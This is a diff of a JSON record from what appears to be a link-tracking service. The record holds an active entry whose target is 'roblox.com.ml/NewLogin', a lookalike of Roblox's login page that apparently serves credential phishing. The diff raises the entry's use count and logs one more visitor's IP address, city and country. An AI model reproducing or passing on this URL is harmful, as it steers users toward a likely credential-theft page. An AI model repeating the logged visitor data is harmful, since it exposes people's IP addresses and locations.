@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 578,
+    "useCount": 579,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4736,6 +4736,14 @@
         "city": "Singapore",
         "flag": "🇸🇬",
         "countryCode": "SG"
+      },
+      {
+        "timestamp": 1777106395871,
+        "ip": "58.10.145.49",
+        "country": "Thailand",
+        "city": "Nakhon Ratchasima",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
       }
     ]
   },
